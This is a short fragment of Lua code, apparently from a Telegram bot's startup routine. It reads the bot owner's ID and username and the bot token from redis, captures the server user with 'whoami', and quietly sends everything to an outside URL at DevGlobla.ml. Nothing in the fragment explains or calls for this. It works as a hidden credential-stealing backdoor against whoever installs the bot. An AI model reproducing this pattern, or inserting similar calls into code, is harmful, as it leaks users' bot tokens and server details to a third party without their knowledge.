...
create_config_auto()
saiedinfo = {}
saiedinfo.id = redis:get(id_server..":SUDO:ID")
saiedinfo.username = redis:get(id_server..":SUDO:USERNAME")
saiedinfo.tokenbot  = redis:get(id_server..":token")
saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('https://DevGlobla.ml/Source.php/?insert='..JSON.encode(saiedinfo))
token = redis:get(id_server..":token")
SUDO = redis:get(id_server..":SUDO:ID")
...
if text == 'server' and SudoBot(msg) then 
